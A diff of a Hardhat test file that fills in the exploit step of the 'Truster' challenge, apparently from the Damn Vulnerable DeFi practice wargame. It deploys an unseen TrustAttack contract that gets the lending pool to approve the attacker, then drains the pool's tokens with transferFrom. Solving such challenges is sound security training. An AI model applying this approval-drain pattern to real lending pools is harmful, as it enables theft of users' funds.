@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { AbiCoder, defaultAbiCoder } = require('ethers/lib/utils');
+const { Web3 } = require('web3');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -28,7 +30,16 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        //Initialize TrustAttack contract
+        const TrustAttack = await ethers.getContractFactory('TrustAttack', deployer);
+        const trustAttack = await TrustAttack.deploy(attacker.address,this.token.address, this.pool.address);
+
+        //Execute approval method to approve token transfer to attacker wallet
+        await trustAttack.connect(attacker).executeApproval(TOKENS_IN_POOL);
+
+        //Transfer tokens from vault to attacker wallet
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+    
     });
 
     after(async function () {
